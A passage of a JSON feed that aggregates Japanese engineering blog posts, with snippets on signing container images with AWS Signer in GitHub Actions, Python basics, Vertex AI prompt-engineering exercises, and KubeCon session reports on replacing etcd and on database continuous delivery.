①セキュリティの強化ALBをパブリックサブネ...","isoDate":"2024-12-27T01:17:11.000Z","dateMiliSeconds":1735262231000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Youkiを動かしてみる","link":"https://qiita.com/ys1/items/7e92327c7728471cfc65","contentSnippet":"概要Kubernetesではコンテナを作成するとき、コンテナランタイム(高レベルランタイム、低レベルランタイム)を利用しています。低レベルランタイムであるyoukiを通じてコンテナに関する理解をちょっと深めます。Youkiとは?YoukiはRust言語で記載され...","isoDate":"2024-12-25T10:51:53.000Z","dateMiliSeconds":1735123913000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Shadcnを使っていてF8でキーボードのフォーカスが取られる","link":"https://zenn.dev/meziron/articles/a0410531f36ecc","contentSnippet":"shadcn を使っていて F8(半角カタカナ変換)がうまくいかない現象shadcn を使用して開発しているプロジェクトで、F8キーを押すとキーボードのフォーカスが奪われてしまい半角カタカナに変換がうまくいかないという現象にぶつかってしまいました。利用しているのUIライブラリなどを追っても中々原因が分からず困っていました。そこで F8 という文字列でコードベースを検索してみると、下記のような interface が見つかりました。interface ToastViewportProps extends PrimitiveOrderedListProps {    /** ...","isoDate":"2024-12-25T06:20:18.000Z","dateMiliSeconds":1735107618000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"AWS re:Invent 2024 へ行って来ました","link":"https://sreake.com/blog/aws-reinvent-2024/","contentSnippet":"スリーシェイクの山田です。 今回、Amazon Web Services (以下 AWS) が 12月 にラスベガスで開催した世界規模のカンファレンスである AWS re:Invent 2024 に現地参加してきたので、 […]The post AWS re:Invent 2024 へ行って来ました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-23T23:00:00.000Z","dateMiliSeconds":1734994800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Workforce Identity + Auth0 で Vertex AI Search の ACL 制御を行う","link":"https://zenn.dev/satohjohn/articles/a422ee68dd3485","contentSnippet":"3-shake AdventCalendar 第2シーズン 23日目の記事になります。2回目の登場です。今回は真面目な(?)技術記事になります。私としては前回書いた記事も大真面目でしたが。 概要今回やりたいこととしては、ウェブアプリケーション上で Id Provider(以後 IdP) 認証をして、その結果を利用して Vertex AI Agent Builder の Search 機能(以後めんどいので旧称の Vertex AI Search として説明) の ACL による検索の権限管理を行うというものです。今回 IdP として Auth0 を利用します。そのため、少し A...","isoDate":"2024-12-22T18:03:43.000Z","dateMiliSeconds":1734890623000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"AWS Signerにおけるコンテナ署名の実装","link":"https://blog.masasuzu.net/entry/2024/12/22/132803","contentSnippet":"この記事は3-shake Advent Calendar 2024の22日目の記事です。AWS Signerを使ったコンテナイメージの署名処理を扱った案件があったのでこちらの紹介となります。ただ、後述するように完成には至ってないです。それでもAWS Signerを使った署名処理と署名検証についての概要をお伝えできるかなと思います。今回のシステムはAWS ECS で Web サービスを運用しています。GitHub Actions を利用してデプロイを行っています。構成としては至ってベーシックな形になっています。今回、コンテナイメージのセキュリティ強化のため、ECR に保存されているイメージが改竄されていないことを保証する要件が追加されました。この記事では、AWS Signer を用いたコンテナイメージの署名と検証の実装、そして現状の課題と今後について記述します。AWS SignerとはWhat is AWS Signer? - AWS SignerAWS Signer はフルマネージドなコード署名サービスです。従来は Lambda 関数などで利用されていましたが、2023年の6月にECRのイメージ署名にも対応しました。AWS がコンテナイメージへの署名を導入Notary ProjectのNotation CLIを用いることで、ECRに保存されているコンテナイメージを署名することができ、署名ファイルをコンテナイメージとともにECRに保存できます。これによりコンテナイメージの真正性と完全性を検証することができます。ECS \xd7 AWS Signer を使ったイメージ署名ワークフローを試してみた - Speaker Deckなお、AWS Signerによるイメージ署名に゙関してはNRI ネットコム様のスライドに詳しく書かれているのでこちらを参照するとより理解が深まります。デプロイフロー変更前デプロイフローとしてはGitHub Actionsでレポジトリ内のソースをdocker buildしたものをECRにpushし、ECS Serviceにデプロイするシンプルなワークフローになります。変更前変更後このワークフローにコンテナイメージ署名の処理を追加します。notationコマンドにSigner Profileのarnを指定して、署名と検証をそれぞれ行う形になります。今回は、GitHub Actions ワークフローに AWS Signer を使った処理を組み込みます。ECRにpushしたイメージに対して署名を行うように変更しました。署名したあとに署名検証を行うことになります。後述しますが、これだけだと本来は不完全なものです。変更後実装ここから実装を見て行きます。先述したワークフローに帰るために以下の変更が必要となります。インフラ側AWS Signer Profileの追加デプロイ用IAM RoleにAWS Signer Profileへのアクセス権の追加デプロイ側署名処理の追加Terraformインフラ側の変更を見ていきましょう。追加箇所としてはSigner Profileの追加とGitHub Actions用のIAM Policyへの権限追加となります。変更箇所以外は今回は割愛しています。platform_idを\\"Notation-OCI-SHA384-ECDSA\\"に指定してSigner Profileを作成します。レポジトリ名をProfile名にしており、レポジトリ名が - 区切りで、Profile名が - を使えないという事情で _ への置換処理をしています。Siner Profileresource \\"aws_signer_signing_profile\\" \\"main\\" {  platform_id = \\"Notation-OCI-SHA384-ECDSA\\"  # profile名に-が使えないので置換  name = replace(var.repository_name, \\"-\\", \\"_\\")}先に作ったSigner Profileへの\\"signer:GetSigningProfile\\"と\\"signer:SignPayload\\"の許可をデプロイ用のRoleのPolicyに付与します。GitHub Actions用IAM Roledata \\"aws_iam_policy_document\\" \\"deploy_policy\\" {  #前略  # イメージ署名  # Inline policies for Signer - AWS Signer  # https://docs.aws.amazon.com/ja_jp/signer/latest/developerguide/authen-inlinepolicies.html  statement {    sid    = \\"SignImage\\"    effect = \\"Allow\\"    actions = [      \\"signer:GetSigningProfile\\",      \\"signer:SignPayload\\"    ]    resources = [      var.signer_profile_arn    ]  }  # 後略}デプロイsigner policyのファイルをあらかじめ作っておきます。このPolicyを利用して、署名検証を行います。.github/aws/signer_policy.json{    \\"version\\":\\"1.0\\",    \\"trustPolicies\\":[      {          \\"name\\":\\"aws-signer-tp\\",          \\"registryScopes\\":[            \\"*\\"          ],          \\"signatureVerification\\":{            \\"level\\":\\"strict\\"          },          \\"trustStores\\":[            \\"signingAuthority:aws-signer-ts\\"          ],          \\"trustedIdentities\\":[            \\"arn:aws:signer:${region}:${account_id}:/signing-profiles/${profile_name}\\"          ]      }    ]}既存のECSのデプロイワークフローにnotationのインストール、イメージ署名処理、イメージ署名検証の処理を追記します。リリースブランチにpushされたことを契機にデプロイが走る形です。.github/workflows/deploy.yamlname: Deploy to ECSon:  push:    branches: [\'release\']env:  AWS_REGION: ap-northeast-1  ECR_REPOSITORY: ${レポジトリ名}  SIGNER_PROFILE_ARN: ${Signer Profile ARN}  SIGNER_POLICY_JSON: .github/aws/signer_policy.jsonjobs:  deploy:    name: Deploy to ECR, ECS    runs-on: ubuntu-latest    steps:      ### 前略      - name: Setup Notation        run: |          wget https://d2hvyiie56hcat.cloudfront.net/linux/amd64/installer/deb/latest/aws-signer-notation-cli_amd64.deb          sudo dpkg -i aws-signer-notation-cli_amd64.deb      - name: Sign image        env:          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}          IMAGE_TAG: ${{ github.sha }}        run: |          notation sign $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG --plugin \\"com.amazonaws.signer.notation.plugin\\" --id \\"$SIGNER_PROFILE_ARN\\"      - name: Verify image        env:          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}          IMAGE_TAG: ${{ github.sha }}        run: |          notation policy import $SIGNER_POLICY_JSON          notation verify $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG      ### 後略課題ここまででイメージの署名処理および署名検証の実装はできました。しかしながら、いくつか課題があります。CIとCDの分離先の実装を見るとわかるのですが、署名したイメージを即時署名検証していることがわかります。これは同じイメージに対して行われているため、実質的な検証にはなっていません。真の改竄検知のためには、CI/CD パイプラインを分離し、デプロイ時に別途署名検証を行う必要があります。また、pushしたコンテナイメージの脆弱性チェックもデプロイ前に行うことが望ましいです。そこで下記のように変更したいところです。ただ、デプロイのフローが変わってしまうので、調整が必要でまだ手をつけていない状態になります。理想正規手順以外でデプロイされたイメージの検証さらに、正規のデプロイフロー以外で起動されたタスクのイメージ検証も課題です。署名されていないイメージが起動されていても何もチェックができていない状態です。これに対するアプローチとしては、EventBridgeでタスクが起動したイベントを拾って、イメージの署名をチェックし、検証できなかったものに゙関しては処理を行う(タスクの停止や通知など)という方法があります。これはContainers on AWSで紹介されているので、この方法を実装できたらと考えています。Container image signing and verification using AWS Signer for Amazon ECS and AWS Fargate | Containers on AWS署名検証のサービス統合ここまで見ていて気付いたかもしれませんが、ECS Serviceがタスクを起動するときに署名されているかどうかをチェックするようにECSサービスと統合されていれば、独自に署名検証を実装する必要はありません。このへん、Google CloudのBinary Authorizationはサービスと統合されているので、署名検証を自前で書く必要がないと理解してます。AWSもサービスと統合して楽に使えるようになることを期待してます。Binary Authorization の概要 \xa0|\xa0 Google Cloudまとめ現状でできていることは以下のとおりです。ECRへpushしたイメージの署名処理現状課題となっているものは以下のとおりです。CI/CDの分離署名されていないコンテナイメージが起動されていないかのチェックこの記事では、AWS Signer を用いたコンテナイメージの署名実装と、残された課題について説明しました。まだできていないことが多いですが、まずビルドしたイメージに対して署名を行うという第一歩を踏み出しました。ここから署名検証の仕組みを強化し、よりセキュアなコンテナ運用を実現するために、引き続き改善に取り組んでいきたいと思ってます。参考リンクAWS がコンテナイメージへの署名を導入AWS Signer と Amazon EKS におけるコンテナイメージ署名の提供開始 | Amazon Web Services ブログECS \xd7 AWS Signer を使ったイメージ署名ワークフローを試してみた - Speaker DeckSign container images in Signer - AWS SignerContainer image signing and verification using AWS Signer for Amazon ECS and AWS Fargate | Containers on AWSBinary Authorization の概要 \xa0|\xa0 Google Cloud","isoDate":"2024-12-22T04:28:03.000Z","dateMiliSeconds":1734841683000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[Python]ロギングの基本的な書き方","link":"https://zenn.dev/takehiro1111/articles/python_logging","contentSnippet":"loggingとは？ただ単純に表示させたいならprint文でも良いが、ログを残すのに特化した機能が豊富なライブラリ。ドキュメントでは以下のように定義されている。 参考logging は、あるソフトウェアが実行されているときに起こったイベントを追跡するための手段です。ソフトウェアの開発者は、特定のイベントが発生したことを示す logging の呼び出しをコードに加えます。イベントは、メッセージで記述され、これに変数データ (すなわち、イベントが起こる度に異なるかもしれないデータ) を加えることもできます。イベントには、開発者がそのイベントに定めた重要性も含まれます。...","isoDate":"2024-12-22T04:15:26.000Z","dateMiliSeconds":1734840926000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Python]datetimeモジュールの使い方","link":"https://zenn.dev/takehiro1111/articles/python_datetime","contentSnippet":"1.datetimeモジュールとは？ ドキュメントの記載datetime モジュールは、日付や時刻を操作するためのクラスを提供しています。日付や時刻に対する算術がサポートされている一方、実装では出力のフォーマットや操作のための効率的な属性の抽出に重点を置いています。 タイムゾーンの解決aware オブジェクトを必要とするアプリケーションのために、 datetime と time オブジェクトは追加のタイムゾーン情報の属性 tzinfo を持ちます。 tzinfo には抽象クラス tzinfo のサブクラスのインスタンスを設定できます。 これらの tzinfo ...","isoDate":"2024-12-21T06:37:30.000Z","dateMiliSeconds":1734763050000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Python]@dataclassの使い方","link":"https://zenn.dev/takehiro1111/articles/python_class_dataclasses","contentSnippet":"@dataclassとは？デコレータの一種イニシャライザでフィールドに引数の値を設定する処理を自動で生成してくれる。 通常の設定class Nouse():  def __init__(self,name,age,gender,job)    self.name = name    self.age = age    self.gender = gender    self.job = job# 引数が多くなりインスタンス変数の設定が増えると管理や可視性の面で難しい。 @dataclassを用いた書き方from dataclasses imp...","isoDate":"2024-12-20T07:22:31.000Z","dateMiliSeconds":1734679351000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Python]Classの基礎文法についてまとめてみた","link":"https://zenn.dev/takehiro1111/articles/python_class_basic","contentSnippet":"Classの概念公式ドキュメントの記載クラスはデータと機能を組み合わせる方法を提供します。 新規にクラスを作成することで、新しいオブジェクトの 型 を作成し、その型を持つ新しい インスタンス が作れます。 クラスのそれぞれのインスタンスは自身の状態を保持する属性を持てます。 クラスのインスタンスは、その状態を変更するための (そのクラスが定義する) メソッドも持てます。 要約データ(属性)と、それを操作するための機能(メソッド)をひとまとまりにした「設計図」みたいなもの。その設計図をもとにいくつでもインスタンス(実体)を作れ、各インスタンスは自分用の属性と...","isoDate":"2024-12-20T06:17:07.000Z","dateMiliSeconds":1734675427000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"生成AIでGitHubソースコード取得して仕様書を作成","link":"https://speakerdeck.com/shukob/sheng-cheng-aidegithubsosukodoqu-de-siteshi-yang-shu-wozuo-cheng","contentSnippet":"https://generative-ai-conf.connpass.com/event/335205/\\r2024生成AI革命期を振り返る忘年会にて、\\r「生成AIでGitHubソースコード取得して仕様書を作成する」というテーマでLTさせていただきました。","isoDate":"2024-12-20T05:00:00.000Z","dateMiliSeconds":1734670800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"[Python]各データ型のメソッドを整理","link":"https://zenn.dev/takehiro1111/articles/python_class","contentSnippet":"1.List 特徴順序があり、変更可能（ミュータブル）。重複要素もOKで、インデックスで要素にアクセスできる メソッド一覧print(dir(list))[\'__add__\', \'__class__\', \'__class_getitem__\', \'__contains__\', \'__delattr__\', \'__delitem__\', \'__dir__\', \'__doc__\', \'__eq__\', \'__format__\', \'__ge__\', \'__getattribute__\', \'__getitem__\', \'__getstate__\', \'__gt__...","isoDate":"2024-12-20T02:25:26.000Z","dateMiliSeconds":1734661526000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"KueueによるKubernetesネイティブなジョブ制御を試してみる","link":"https://sreake.com/blog/kueue-kubernetes-native-job-control/","contentSnippet":"Kueue KueueはKubernetesのSIG-Schedulingのサブプロジェクトとして開発が進められている、クラスター内のバッチ・HPC・AI/MLといったジョブのキューイングを提供するAPIとコントローラの […]The post KueueによるKubernetesネイティブなジョブ制御を試してみる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-19T03:05:13.000Z","dateMiliSeconds":1734577513000,"authorName":"Sreake","authorId":"Sreake"},{"title":"プロンプトエンジニアリング プログラミング ハンズオン","link":"https://shu-kob.hateblo.jp/entry/2024/12/17/185729","contentSnippet":"genai-users.connpass.comこの記事は上記勉強会の資料です。shu-kob.hateblo.jp↑上記記事を参考にサービスアカウントの設定をしてください。※ Google Cloudの無料期間が終了していると、課金されますが、ハンズオンの内容だけだと数百円もいかないと考えています。料金は確実には言えないので、Google Cloudはご自身の責任でご使用ください。github.com↑今回のサンプルコードgit clone https://github.com/shu-kob/prompt_engineeringcd prompt_engineeringpip install vertexaiLangChainを使わずVertex AIのライブラリを使用シンプルなVertex AIでGeminiを実行project_id = \\"PROJECT_ID\\" # 書き換える実行python3 generate_content.pyresponse = model.generate_content(  \\"プロンプトエンジニアリングとは\\")プロンプトを変更して実行してみましょう。Zero Shot プロンプティングproject_id = \\"PROJECT_ID\\" # 書き換える実行python3 zero_shot_prompting.pyprompt = \\"\\"\\"以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================紅白出場歌手の選考基準 NHK公開\\"\\"\\"プロンプトを変更して実行してみましょう。Few Shot プロンプティングproject_id = \\"PROJECT_ID\\" # 書き換える実行python3 few_shot_prompting.pyprompt = \\"\\"\\"以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================「紅白出場歌手の選考基準 NHK公開」===========================以下は例です「G20 バイデン氏不在で集合写真」:政治「岡田将生&高畑充希結婚 SNS反応」:芸能\\"\\"\\"プロンプトを変更して実行してみましょう。LangChainを使用langchain_google_vertexai を使用pip install langchain_google_vertexaipython3 invoke.pymessages = [  (\\"human\\", \\"ネコの鳴き真似をしてください。\\"),]プロンプトを変更して実行してみましょう。PromptTemplateを使用pip install langchain_corepip install pydantic==2.9.0実行python3 prompt_template.pyプロンプトテンプレートやQuestionを変更して実行してみましょう。ChatPromptTemplateを使用実行python3 chat_prompt_template.pyprompt_template = ChatPromptTemplate.from_messages([    (\\"system\\", \\"ステップバイステップで考えてください。\\"),    (\\"human\\", \\"{question}\\"),])question = \\"\\"\\"10 + 2 * 3 - 4 * 2\\"\\"\\"システムプロンプトやQuestionを変更して実行してみましょう。参考資料python.langchain.compython.langchain.com参考文献LangChainとLangGraphによるRAG・AIエージェント［実践］入門Google Gemini 1.5／LlamaIndex／LangChain 人工知能プログラミング実践入門","isoDate":"2024-12-17T09:57:29.000Z","dateMiliSeconds":1734429449000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run GPU 上の PaliGemma2 に私の娘は可愛いと言わせるまで","link":"https://zenn.dev/satohjohn/articles/33b27212b3a55e","contentSnippet":"この記事は 3-shake Advent Calendar 2024 シーズン1 16日目の記事 & Jagu\'e\'r Advent Calendar 2024 4日目の記事 になります。3-shake に入社してそろそろ丸2年が経過しようとしており、感慨深く思っております。こういうカレンダーをちゃんと埋められているのをみていても、アウトプットという形で自己研鑽や表現を行う素晴らしいメンバーが多いなと日々日々感じております。そんな中で書けるのも良い経験だと感じております。という前置きを入れつつ、今回は生成 AI の中でも OSS でマルチモーダルな LLM である PaliG...","isoDate":"2024-12-16T11:20:30.000Z","dateMiliSeconds":1734348030000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"業務用Macセットアップ備忘録","link":"https://qiita.com/masaru-komiyama/items/cbd7d140cabf131688d9","contentSnippet":"この記事はアドベントカレンダー「3-shake Advent Calendar 2024 シリーズ2」の16日目の記事です。はじめに業務用Macの利用環境に関するセットアップ備忘録を記述しています。設定、導入アプリ、利用しているハードウェアなどをメモった形。ご利用...","isoDate":"2024-12-15T14:45:01.000Z","dateMiliSeconds":1734273901000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"KubeCon NA 2024: Goodbye etcd! Running Kubernetes on Distributed PostgreSQLのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/15/goodbyte_etcd_running_kubernetes_on_distributed_postgresql","contentSnippet":"この記事は以下アドベントカレンダー15日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2Goodbye etcd! Running Kubernetes on Distributed PostgreSQL セッションレポートセッション概要 https://kccncna2024.sched.com/event/1i7rt/goodbye-etcd-running-kubernetes-on-distributed-postgresql-denis-magda-yugabyteセッション動画 www.youtube.comこのセッションはKubernetesクラスタのメタデータストアとして利用されるetcdをDistributed PostgreSQLであるYugabyteDBに置き換えた方法を紹介し、デモを行っています。What\'s etcd?セッションはetcdの解説から始まりました。etcdは分散可能で可用性の高いキーバリューストアであり、シンプルながらも強力なデータベースとして機能します。Raftプロトコルを用いることで、複数のマシンやVMで構成されたクラスタ全体にわたって変更を複製し、ノード障害発生時にも一貫したデータと継続的な動作を保証します。Kubernetesはこのetcdをメタデータストアとして活用し、サービスのポート数やデプロイメントのPod数といったクラスタの状態を管理しています。このセクションはetcdの役割を明確に示し、Kubernetesにおける重要性を理解する上で有用でした。etcdがKubernetesの心臓部と言える重要な役割を担っていることを再認識させられました。Why some are not happy with etcdetcdは多くのKubernetesクラスタで標準的に利用されていますが、大規模環境（100～1000ノード）ではスケーラビリティに課題があることが指摘されました。このようなケースでは、etcdから分散データベースへの移行が必要となります。さらに、etcdプロジェクトへのコントリビュータ不足も懸念材料として挙げられており、Kubernetesが必要とする機能追加への対応が遅れる可能性が示唆されました。このセクションは、etcdの潜在的な問題点を浮き彫りにし、代替手段を検討する必要性を示唆しています。特に大規模運用を想定している場合、etcdのスケーラビリティの限界は深刻な問題になり得ます。KineKineはKubernetesクラスタとリレーショナルデータベース間の仲介役として機能するシミュレータレイヤです。etcd APIをSQLに変換することで、PostgreSQLやMySQLのようなリレーショナルデータベースをKubernetesのメタデータストアとして利用可能にします。Kubernetes APIサーバーが発行したetcd APIをKineがSQLに変換し、データベースに実行することで、etcdの代替を実現します。このセクションはKineの動作原理を簡潔に説明し、リレーショナルデータベースをKubernetesと統合する仕組みを理解する上で重要です。Kineの存在によって、既存のデータベース基盤を活用したKubernetes運用が可能になります。Hands-onデモ環境はGoogle Cloud上の3つのCompute Engine（us-westリージョンの異なるゾーン）に構築されたk3sクラスタで、純粋なPostgreSQLと分散型PostgreSQLであるYugabyteDBの2つのシナリオが示されました。純粋なPostgreSQLは単一VMで、YugabyteDBは3台のVMで実行され、マルチゾーン、マルチリージョン、マルチクラウド/オンプレミス環境への拡張可能性が示唆されました。このセクションはデモ環境の概要を説明し、異なるデータベース構成でのKubernetes運用の可能性を示しています。実環境に近い構成でのデモは、KineとYugabyteDBの有効性を理解する上で非常に役立ちます。Kubernetes on Pure PostgreSQLyoutu.beこのデモでは、PostgreSQLが動作するサーバ上でk3sを実行し、Kineが必要とするオブジェクトがPostgreSQLに作成される様子、そしてk3s自体の動作確認が示されました。既存のPostgreSQL環境へのKubernetesの導入を検討する際に、このデモは具体的な手順と動作イメージを提供してくれます。データベース管理者にとって、Kineによるデータベースへの影響を視覚的に確認できる点は非常に重要です。Kubernetes on YugabyteDBYugabyteDBとは？YugabyteDBは、PostgreSQL互換の分散SQLデータベースです。クエリレイヤはPostgreSQLからフォークされ、ストレージレイヤはLSMツリーベースの実装1を採用しています。複数サーバ・複数リージョンでの運用が可能で、クエリ分散やノード障害時の継続動作を実現します。etcdと同様にRaftプロトコルを利用することで、データの一貫性を確保し、ネットワーク分断時のスプリットブレインにも対応します。このセクションはYugabyteDBの特徴を説明し、高可用性と分散性を備えたデータベースとしての利点を明確に示しています。etcdの代替としてYugabyteDBを検討する際に、この情報は非常に重要です。デモyoutu.beYugabyteDBクラスタ上でk3sを実行するデモでは、PostgreSQLの場合とほぼ同様の手順でKubernetesを起動できることが示されました。YugabyteDBのダッシュボードを用いて、データベースの情報やKineが作成した情報を確認できる点も強調されました。さらに、Kubernetesのサンプルアプリを起動することで、etcdベースのKubernetesと同等の動作が確認されました。1台のCompute Engineを停止させることでYugabyteDBノードの障害をシミュレートし、データベースとKubernetesが継続して動作することを実証しました。このデモは、YugabyteDBの耐障害性と高可用性を視覚的に示し、実運用環境での信頼性を裏付けています。結論このセッションは、KineとYugabyteDBを用いることで、etcdの代替としてリレーショナルデータベースをKubernetesのメタデータストアとして利用できることを示しました。特に、YugabyteDBの分散性と耐障害性は、大規模Kubernetesクラスタの運用においてetcdのスケーラビリティやコントリビュータ不足といった課題を解決する可能性を示唆しています。ただし、YugabyteDBの導入には運用コストや学習コストといった新たな課題も発生するため、etcdとの比較検討が必要です。同様にセッションではKineをネイティブに利用しているk3sを利用していますが、k3sはあくまでKubernetesの軽量ディストリビューションであるため完全に同じものではないため、本当にk3sで良いのかという比較検討も必要になります。またセッション内では100を超えるノードから構成されるKubernetesクラスタではetcdのスケーラビリティが足りず、他のメタデータストアが必要になると紹介していますが、なぜ必要になるかは説明が不足していると感じました。これはKubernetesクラスタが大規模化することでAPIサーバが発行するクエリがetcdの対応可能な10000 rpsを越え始めるためです。より詳細な説明はGoogle Cloudの65000ノードを越えるGKEクラスタをSpannerでホストしていることを紹介しているブログが参考になるでしょう。cloud.google.com","isoDate":"2024-12-15T14:16:36.000Z","dateMiliSeconds":1734272196000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes The Hard Wayにトライする","link":"https://zenn.dev/moz_sec/articles/0dbb3b7dd08ab3","contentSnippet":"KuberenetesKubernetesとは、複数のコンピュータでコンテナをいい感じに動かしてくれるものです。Kubernetesの説明はいろんなサイトに書いてあるため、そちらを参照してください。公式サイトも参考になります。https://kubernetes.io/docs/concepts/overview/ Kuberentes The Hard WayKubernetes The Hard Wayとは、kubeadmやkubesplayのような、クラスタ構築ツールに頼らず、コンテナランタイムや各コンポーネントを自分でインストールして、設定をし、Kubernetes...","isoDate":"2024-12-15T12:14:59.000Z","dateMiliSeconds":1734264899000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Reckoner における Datadog Error Tracking の活用事例","link":"https://zenn.dev/nomadblacky/articles/1901ceb9154c7b","contentSnippet":"この記事は、3-shake Advent Calendar 2024 の 15 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。Reckoner では多種多様な連携先に対応しているため、様々なエラーが発生する可能性があります。そのため、エラーの迅速な発見と...","isoDate":"2024-12-15T10:35:38.000Z","dateMiliSeconds":1734258938000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"KubeCon NA 2024: Database DevOps: CD for Stateful Applicationsのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/14/database_devops_cd_for_stateful_applications","contentSnippet":"この記事は以下アドベントカレンダー14日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ1Database DevOps: CD for Stateful Applications セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7na/database-devops-cd-for-stateful-applications-stephen-atwell-harnessio-christopher-crow-pure-storage?linkback=grid-fullセッションスライドhttps://static.sched.com/hosted_files/kccncna2024/86/Harness-Portworx%20Kubecon%202024.pdfこの記事内の画像は全てこのスライドより引用しています。セッション動画  www.youtube.comこのレポートでは、KubeCon + CloudNativeCon North America 2024 のセッション「Database DevOps: CD for Stateful Applications」の内容をまとめたもので、DatabaseのDevOpsとステートフルアプリケーションの継続的デリバリについてです。データベースCDの課題と解決策セッションでは、データパイプラインのデータテストをデリバリパイプラインに統合することの重要性が強調されていました。従来、データベースのテストは、BIツールなどを用いたカスタマイズされた方法で行われることが多かったようですが、最も信頼性の高いテスト方法は、新旧バージョンで同じデータに対してテストを実行することだとスピーカーは主張していました。そして、Kubernetesはこのようなテストを大幅に簡略化できるとのことでした。この主張は、データベースの変更がアプリケーション全体に及ぼす影響を正確に把握し、本番環境へのデプロイ前に潜在的な問題を早期に発見するために非常に重要です。Kubernetesによるデータベース運用の進化セッションで紹介されたアーキテクチャの進化は、Kubernetesがデータベース運用にもたらす利点を明確に示していました。初期のアーキテクチャでは、アプリケーション、データベース、インフラストラクチャの変更が個別に管理されていましたが、発展したアーキテクチャでは、これらが統合されたCI/CDパイプラインで管理されています。この統合により、アプリケーション、データベース、インフラストラクチャの変更をE2Eでテストできるようになり、本番環境へのデプロイリスクを大幅に軽減できます。このアーキテクチャの進化は、マイクロサービスアーキテクチャやクラウドネイティブ開発との親和性が高いと言えます。マイクロサービスでは、個々のサービスが独立してデプロイされるため、データベースの変更が他のサービスに及ぼす影響を正確に把握することが重要です。Kubernetesはこのような複雑な依存関係を管理し、安全なデプロイを実現するための強力なプラットフォームを提供します。デモのオーバービューセッションでは、具体的なスキーママイグレーションのシナリオを例に、ダウンタイムゼロでのデータベース変更を実現する方法が紹介されていました。WarehouseテーブルのLocationカラムの衝突問題を解決するために、CityとStateカラムを追加し、Locationカラムとの同期をトリガーで実現する方法は、実務で非常に役立つアプローチです。この手法は、データベースの変更によるアプリケーションへの影響を最小限に抑え、ユーザー体験を損なうことなくシステムを進化させることを可能にします。デモで利用されるCDパイプラインデモで適用されるデータベースへの変更個人的にはこのようなユースケースのテストシナリオは複雑になることが多いと考えていたため、自動化を行うには相当のカスタマイズが必要になると思っていたので、この後のデモの手軽さには非常に驚かされました。デモのハイライトとHarnessの活用youtu.beこのセッションはデモが全体のほとんどを閉めています。デモ開始時点のリンクがブログ記事の中盤にあるので、デモ部分だけでもご覧になることを強く推奨します。セッションのデモでは、Harnessというツールが使用され、変更プロセスとロールバック手順が分かりやすく可視化されていました。Harnessは、GitLab CI/CDやGitHub ActionsのようなUIを提供し、各ステップの成功/失敗を容易に確認できる点が優れていると感じました。特に、ArgoCDとの連携によるデータベースとアプリケーションの協調動作は、複雑なデプロイプロセスを簡素化する上で非常に効果的です。デモで紹介された、望ましい状態になっていないことを確認し、変更を加えるプロセスは、実践的な知見を提供していました。また、データベースの変更セットの一部として事前にロールバック手順を定義しておくことは、本番環境での予期せぬ問題発生時に迅速な対応を可能にするベストプラクティスと言えるでしょう。LiquibaseやFlywayなどのツールはこのような機能を提供しており、データベースDevOpsの実践において不可欠です。HarnessではデータベースのDevOpsをアプリケーション、インフラストラクチャー込みで実現しており、非常に理想的なツールのように見えました。一方でこのセッションのスピーカーのひとりはHarnes.ioのエンジニアであるため、ポジショントークや見せたい部分しか見せていないことが十分考えられるので全てを鵜呑みにするのは危険です。それを差し引いても興味深いデモだったので、セッションで紹介された技術スタックを検証してみたいと思っています。まとめこのセッションは、Kubernetesとツールを活用することで、データベースの変更を安全かつ効率的に行う方法を示していました。E2Eテスト、ダウンタイムゼロのスキーママイグレーション、そしてロールバック手順の自動化は、データベースDevOpsを実現するための重要な要素です。これらの手法を適切に組み合わせることで、開発速度を向上させながら、システムの安定性と信頼性を維持することが可能になります。しかし、ここで紹介された手法は全ての状況に適用できるわけではありません。例えば、大規模なデータベースや複雑なトランザクション処理を行うシステムでは、ダウンタイムゼロのマイグレーションが困難な場合があります。そのようなケースでは、段階的なロールアウトやカナリアリリースなどの手法を検討する必要があります. また、ツールの導入や運用にはコストがかかるため、組織の規模やリソースに合わせて適切なツールを選択することが重要です。今後のデータベース運用においては、自動化と可観測性をさらに強化し、自己修復機能を備えた自律的なデータベース運用を目指していくことが重要だと考えます。Kubernetesやクラウドネイティブ技術は、この目標を実現するための基盤となるでしょう。またこのセッションを見るまで、個人的にDatabase on 